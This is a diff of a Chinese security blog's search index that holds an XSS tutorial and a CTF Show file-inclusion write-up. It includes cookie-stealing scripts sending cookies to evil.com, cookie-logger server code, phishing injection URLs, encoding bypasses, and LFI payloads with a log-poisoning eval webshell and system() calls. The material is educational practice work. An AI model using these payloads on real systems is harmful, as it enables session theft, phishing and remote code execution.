@@ -1,6 +1,100 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>xss跨站脚本漏洞</title>
+    <url>/2022/XSS/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+<span id="more"></span>
+
+<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
+<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
+<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<p><img src="/image-20220316233924916.png"></p>
+ 
+
+<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
+<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<p><img src="/image-20220316233332570.png"></p>
+ 
+
+<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
+<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
+<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
+<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
+<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
+<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
+<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
+<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
+<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
+<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
+<ul>
+<li><strong>重定向钓鱼</strong></li>
+</ul>
+<p>将当前访问重定向到一个钓鱼网页</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>HTML注入式钓鱼</strong></li>
+</ul>
+<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>iframe钓鱼</strong></li>
+</ul>
+<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Flash钓鱼</strong></li>
+</ul>
+<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
+<ul>
+<li><p>高级钓鱼技术</p>
+<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
+</li>
+</ul>
+<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
+<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
+<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
+<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
+<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
+<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
+<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
+<li><strong>HTML实体编码</strong></li>
+</ul>
+<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
+<p>字符编码</p>
+<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
+<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
+<ul>
+<li><strong>URL编码</strong></li>
+</ul>
+<p>两次URL全编码</p>
+<ul>
+<li><strong><code>String.fromCharCode</code>编码</strong></li>
+</ul>
+<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
+<p>XSS绕过也可以看看该文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
+<hr>
+<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Misc小合集（一）</title>
     <url>/2022/Misc%E5%B0%8F%E5%90%88%E9%9B%861/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次杂项小训练</p>
@@ -201,97 +295,203 @@
       </tags>
   </entry>
   <entry>
-    <title>xss跨站脚本漏洞</title>
-    <url>/2022/XSS/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+    <title>CTF Show(文件包含)</title>
+    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本场题目来自于CTF show，本文只是记录学习过程，以及能够提供一点小帮助再好不过</p>
+<p><strong>web78 -web118</strong></p>
 <span id="more"></span>
 
-<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
-<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
-<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p><img src="/image-20220316233924916.png"></p>
- 
 
-<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
-<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p><img src="/image-20220316233332570.png"></p>
- 
+<h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
-<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
-<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
-<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
-<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>使用php伪协议php:&#x2F;&#x2F;filter来构造payload</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</span><br><span class="line"></span><br><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-16469231625671.png"></p>
 
-<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
-<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
-<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
-<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
-<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
-<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
+
+<h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F; 伪协议"></a>file:&#x2F;&#x2F; 伪协议</h2><p><code>file=file:///var/log/nginx/access.log</code>，来确定是否能读取 nginx 的日志。</p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_1.png"></p>
+
+
+<p>确认日志可以访问，对其抓包</p>
+<p>使用Burp进行抓包，并修改 User-Agent 为 <code>&lt;?php @eval($_GET[cmd]);echo PHP_DATADIR;?&gt;</code></p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_2.png" alt="image_2"></p>
+
+
+<p>再次访问可以看到即可查看 PHP 的执行路径。</p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_3.png"></p>
+
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=file:///var/log/nginx/access.log&amp;cmd=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_4.png"></p>
+
+
+<p>也可以直接执行</p>
+<p>pay</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>代码会将php，替换为？？？</p>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>方法同上。利用Burp将恶意代码上传，然后直接进行命令执行。</p>
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>我们在网址加上参数 <code>?file=PHP://input</code>，利用burp抓包,添加命令</p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_5.png"></p>
+
+
+<p>修改命令为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>得到flag</p>
+<p><img src="/image/image_6.png"></p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_6.png"></p>
+
+
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>学习到 2 种思路。一是利用特殊的 PHP 语言标记，二是利用编码绕过。</p>
+<h4 id="特殊的-PHP-语言标记"><a href="#特殊的-PHP-语言标记" class="headerlink" title="特殊的 PHP 语言标记"></a>特殊的 PHP 语言标记</h4><p>常见的 PHP 语言标记有如下几种：</p>
 <ul>
-<li><strong>重定向钓鱼</strong></li>
+<li><code>&lt;?php phpinfo() ?&gt;</code>：如果只含有 PHP 代码， <code>?&gt;</code> 不允许存在。<code>?&gt;</code> 隐含一个 <code>;</code>，所以最后一句可以不用分号。</li>
+<li><code>&lt;script language=“php”&gt;phpinfo()&lt;script&gt;</code>。</li>
+<li><code>&lt;? ?&gt;</code>：需要修改 PHP 的 <code>short_open_tag</code> 配置</li>
+<li><code>&lt;% %&gt;</code>：默认禁用。</li>
+<li><code>&lt;?=$variablename ?&gt;</code>：默认可用。</li>
+<li><code>&lt;%=$variablename  %&gt;</code>：默认禁用。</li>
 </ul>
-<p>将当前访问重定向到一个钓鱼网页</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>pay</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><strong>HTML注入式钓鱼</strong></li>
-</ul>
-<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><strong>iframe钓鱼</strong></li>
-</ul>
-<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>将上面的pay改成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><strong>Flash钓鱼</strong></li>
-</ul>
-<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
-<ul>
-<li><p>高级钓鱼技术</p>
-<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
-</li>
-</ul>
-<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
-<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
-<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
-<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
-<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
-<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
-<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
-<li><strong>HTML实体编码</strong></li>
-</ul>
-<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
-<p>字符编码</p>
-<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
-<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
-<ul>
-<li><strong>URL编码</strong></li>
-</ul>
-<p>两次URL全编码</p>
-<ul>
-<li><strong><code>String.fromCharCode</code>编码</strong></li>
-</ul>
-<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
